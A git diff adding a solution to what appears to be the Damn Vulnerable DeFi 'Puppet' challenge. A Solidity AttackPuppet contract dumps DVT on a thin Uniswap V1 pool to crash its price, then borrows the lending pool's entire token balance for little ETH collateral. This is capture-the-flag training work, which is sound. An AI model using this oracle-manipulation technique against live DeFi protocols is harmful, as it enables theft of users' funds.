@@ -93,6 +93,18 @@ contract PuppetChallenge is Test {
      */
     function test_puppet() public checkSolvedByPlayer {
         
+        // We don't need to pass all the ETH, we have 25 but actually 11 is going to be enough
+        // since we will receive ~9 ETH once we swap out DVT, and ~20 ETH will be enough
+        // collateral to drain the pool
+        AttackPuppet attackPuppet = new AttackPuppet { value: 11e18 } (
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery
+        );
+
+        token.transfer(address(attackPuppet), PLAYER_INITIAL_TOKEN_BALANCE);
+        attackPuppet.start();
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +127,44 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract AttackPuppet {
+
+    DamnValuableToken token;
+    PuppetPool pool;
+    IUniswapV1Exchange exchange;
+    address recovery;
+
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _pool,
+        IUniswapV1Exchange _exchange,
+        address _recovery 
+    ) payable {
+        token = _token;
+        pool = _pool;
+        exchange = _exchange;
+        recovery = _recovery;
+    }
+
+    function start() public {
+        uint ourInitialTokenBalance = token.balanceOf(address(this));
+
+        // Sell DVT to the exchange, dumping it's price
+        token.approve(address(exchange), ourInitialTokenBalance);
+        // Since the pool has 10 ETH and 10 DVT and we're selling a bit amount (1,000 DVT)
+        // We expect to receive at least 9 ETH for our tokens (this is our slippage tolerance)
+        exchange.tokenToEthTransferInput(ourInitialTokenBalance, 9e18, block.timestamp, address(this));
+
+        // 20 ETH will be enough to drain the whole 100K DVT tokens since it's price is not 1:1 anymore,
+        // because we dumped it's price significantly, remember?
+        pool.borrow{value: 20e18}(
+            token.balanceOf(address(pool)), // Try to drain all pool's DVT liquidity
+            recovery
+        );
+    }
+
+    // to be able to receive ETH (after exchange swap)
+    receive() external payable {}
 }
